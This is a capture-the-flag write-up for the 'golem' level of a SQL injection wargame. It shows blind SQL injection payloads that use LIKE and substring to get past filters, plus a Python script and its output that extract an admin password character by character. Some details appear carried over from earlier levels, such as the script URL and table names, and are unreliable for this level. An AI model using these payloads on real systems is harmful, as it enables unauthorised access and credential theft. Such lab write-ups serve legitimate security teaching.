---
custom_edit_url: null
pagination_next: null
pagination_prev: null
sidebar_position: 11
---

![1](https://github.com/Kunull/Write-ups/assets/110326359/70c7ce92-21ac-447b-af42-ded1eaaf1b64)

We are provided with the SQL query:

```sql
SELECT id FROM prob_golem WHERE id='guest' AND pw='{$_GET[pw]}'
```

The code also performs two conditional checks:

1. `if($result['id'])`: It checks if the statement is `True`. If yes, it prints the following message: `Hello admin`
2. `if(($result['pw']) && ($result['pw'] == $_GET['pw']))`: It then checks if the `pw` that is provided is correct. If yes, it prints the flag.

It is similar to [orge](https://writeups-kunull.vercel.app/Lord%20of%20SQLInjection/orge) but this level also blocks the `=` and `substr` characters. So we will have to use their alternatives `LIKE` and `substring` respectively.

In order to print out the flag, we need to first know the password. We have to perform a Blind SQL Injection.

## Blind SQL Injection

First we have to reveal the length of the flag.

### Retrieving the password length

If we provide the following URI parameter:

```
?pw=' || id LIKE 'admin' %26%26 length(pw) LIKE 1 -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 1 -- -'

## Queried part:
SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 1

## Commented part:
'
```

![2](https://github.com/Kunull/Write-ups/assets/110326359/34e0d15d-bb1c-43c8-a2a2-03ec0cbec69b)

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.
That tells us that the length of the `pw` column is more than 1.

If we keep increasing the length and provide the following URI parameter:

```
?pw=' || id LIKE 'admin' %26%26 length(pw) LIKE 8 -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 8 -- -'

## Queried part:
SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' && length(pw) LIKE 8

## Commented part:
'
```

![3](https://github.com/Kunull/Write-ups/assets/110326359/eacec623-361b-4530-b07b-b10699861646)

Since the `Hello admin` message is printed, we know that the resultant query resulted in `True`.
That tells us that the length of the `pw` column is 8.


### Leaking the password

Next, we can leak the password byte by byte using the `substr()` function.

#### `substr()`

![Pasted image 20240610125927](https://github.com/Kunull/Write-ups/assets/110326359/063e53c5-9020-42b4-b78a-40133f95d84d)

If we provide the following URI parameter:

```
?pw=' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '0' -- -
```

The resultant query becomes:

```sql
SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '0' -- -'

## Queried part:
SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '0'

## Commented part:
'
```

![4](https://github.com/Kunull/Write-ups/assets/110326359/c13d9b1f-2d75-43fc-9d07-9845caf35c90)

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.

That tells us that the first character of the `pw` for `id=admin` is not `0`.

We can try other characters moving up to the following:

```
?pw=' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '7' -- -
```

The resultant query then becomes:

```sql
SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '7' -- -'

## Queried part:
SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 1, 1) LIKE '7'

## Commented part:
'
```

![5](https://github.com/Kunull/Write-ups/assets/110326359/d89bfdba-6af8-44c9-9881-968141be2efa)

We can move onto the next characters:

```
?pw=' || id LIKE 'admin' %26%26 substring(pw, 2, 1) LIKE '0' -- -
```

The resultant query then becomes:

```sql
SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 2, 1) LIKE '0' -- -'

## Queried part:
SELECT id FROM prob_golem WHERE id='admin' AND pw='' || id LIKE 'admin' %26%26 substring(pw, 2, 1) LIKE '0'

## Commented part:
'
```

![6](https://github.com/Kunull/Write-ups/assets/110326359/f0b3cf8f-0dde-461d-a853-a9a0ebbd8b47)

Since the `Hello admin` message is not printed, we know that the resultant query did not result in `True`.

That tells us that the second character of the `pw` for `id=admin` is not `0`.

We can keep repeating this process until we get all the eight characters of the `admin` password:

```
77d6290b
```

### Script

We can automate the entire process using a script.

```py title="golem_script.md"
import requests
import urllib.parse
import string

cookies = {'PHPSESSID': 'jeae4igtrh2cq92r63ob4kqmqr'}
url = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
password_length = 0

for x in range(0, 10):
  payload = f"' || id LIKE 'admin' && length(pw) LIKE {x} -- -"
  encoded_payload = urllib.parse.quote_plus(payload)
  full_url = f"{url}?pw={encoded_payload}"
    
  response = requests.get(full_url, cookies=cookies)
    
  if "Hello admin" in response.text:
    password_length = x
    break

print()    
print(f"[!] Payload: ?pw={payload}")
print(f"[!] Payload (URL encoded): ?pw={encoded_payload}")
print(f"[!] Password length: {password_length}")

password = ""
searchspace = string.digits + string.ascii_letters

for index in range(1, password_length + 1):
  for char in searchspace:
    payload = f"' || id LIKE 'admin' && substring(pw, {index}, 1) LIKE '{char}' -- -"
    encoded_payload = urllib.parse.quote_plus(payload)
    full_url = f"{url}?pw={encoded_payload}"

    response = requests.get(full_url, cookies=cookies)

    if "Hello admin" in response.text:
      password += char
      print()
      print(f"[+] Payload: ?pw={payload}")
      print(f"[+] Payload (URL encoded): ?pw={encoded_payload}")
      print(f"[+] Character at index {index}: {char}")
      break

print()
print(f"[!] Extracted password: {password}")
print(f"[!] Final payload: ?pw={password}")
```

```
$ python .\golem_script.py.py

[!] Payload: ?pw=' || id LIKE 'admin' && length(pw) LIKE 8 -- -
[!] Payload (URL encoded): ?pw=%27+%7C%7C+id+LIKE+%27admin%27+%26%26+length%28pw%29+LIKE+8+--+-
[!] Password length: 8

[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 1, 1) LIKE '7' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id+LIKE+%27admin%27+%26%26+substring%28pw%2C+1%2C+1%29+LIKE+%277%27+--+-
[+] Character at index 1: 7

[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 2, 1) LIKE '7' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id+LIKE+%27admin%27+%26%26+substring%28pw%2C+2%2C+1%29+LIKE+%277%27+--+-
[+] Character at index 2: 7

[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 3, 1) LIKE 'd' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id+LIKE+%27admin%27+%26%26+substring%28pw%2C+3%2C+1%29+LIKE+%27d%27+--+-
[+] Character at index 3: d

[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 4, 1) LIKE '6' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id+LIKE+%27admin%27+%26%26+substring%28pw%2C+4%2C+1%29+LIKE+%276%27+--+-
[+] Character at index 4: 6

[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 5, 1) LIKE '2' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id+LIKE+%27admin%27+%26%26+substring%28pw%2C+5%2C+1%29+LIKE+%272%27+--+-
[+] Character at index 5: 2

[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 6, 1) LIKE '9' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id+LIKE+%27admin%27+%26%26+substring%28pw%2C+6%2C+1%29+LIKE+%279%27+--+-
[+] Character at index 6: 9

[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 7, 1) LIKE '0' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id+LIKE+%27admin%27+%26%26+substring%28pw%2C+7%2C+1%29+LIKE+%270%27+--+-
[+] Character at index 7: 0

[+] Payload: ?pw=' || id LIKE 'admin' && substring(pw, 8, 1) LIKE 'b' -- -
[+] Payload (URL encoded): ?pw=%27+%7C%7C+id+LIKE+%27admin%27+%26%26+substring%28pw%2C+8%2C+1%29+LIKE+%27b%27+--+-
[+] Character at index 8: b

[!] Extracted password: 77d6290b
[!] Final payload: ?pw=77d6290b
```

Now, we can provide password URI parameter:

```
?pw=77d6290b
```

The resultant query becomes:

```sql
SELECT id FROM prob_orc WHERE id='admin' AND pw='77d6290b'
```

![7](https://github.com/Kunull/Write-ups/assets/110326359/32bafc83-a76d-4d3d-98b0-8f47a4f83333)
